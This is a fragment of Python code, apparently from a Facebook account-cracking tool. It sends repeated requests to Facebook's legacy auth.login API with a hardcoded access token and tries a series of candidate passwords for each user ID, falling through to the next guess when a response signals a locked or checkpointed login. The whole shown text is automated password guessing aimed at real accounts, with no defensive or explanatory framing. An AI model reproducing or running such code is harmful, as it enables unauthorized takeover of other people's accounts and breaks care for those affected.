...
def a_s():
    ...
    def main(arg):
        ...
        try:
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + uid + '&pass=' + pass1, headers = header).text
            d = json.loads(q)
            if 'loc' in q:
                ...
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + uid + '&pass=' + pass2, headers = header).text
                d = json.loads(q)
                if 'loc' in q:
                    ...
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + uid + '&pass=' + pass3, headers = header).text
                    d = json.loads(q)
                    if 'loc' in q:
                        ...
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + uid + '&pass=' + pass4, headers = header).text
                        d = json.loads(q)
                        if 'loc' in q:
